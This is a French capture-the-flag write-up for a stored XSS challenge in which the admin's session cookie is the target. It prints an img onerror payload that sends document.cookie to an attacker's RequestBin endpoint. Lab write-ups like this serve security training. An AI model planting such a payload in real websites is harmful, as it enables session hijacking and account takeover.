# XSS - Stockée 1
facebooklinkedintwitter
## 30 Points  0x0
### Du gateau !
## Énoncé
Volez le cookie de session de l’administrateur et utilisez le pour valider l’épreuve.
## Solution

On arrive sur un site ou on peut envoyer des messages que l'admin va ensuite lire. En envoyant un premier message et en reloadant la page, on voit que les messages sont permanents. On peut donc définitivement procédé à une attaque via une stored xss.

On va donc ecrire un titre au hasard et puis envoyer ceci:
```HTML
<img src=x onerror=this.src="[endpointURL]?cookie="+document.cookie  >
```

lorsque l'admin tombera dessus, on aura donc accès à son cookie. Mais il faut d'abord mettre en place son endpoint.

Pour cela, je me suis aider du site RequestBin pour générer mon endpoint et récupérer les requêtes sur celui-ci. En attendant un peu, on peu voir dans les requêtes que l'une a été faites en utilisant ADMIN_COOKIE.

On a donc récupérer le cookie de l'admin.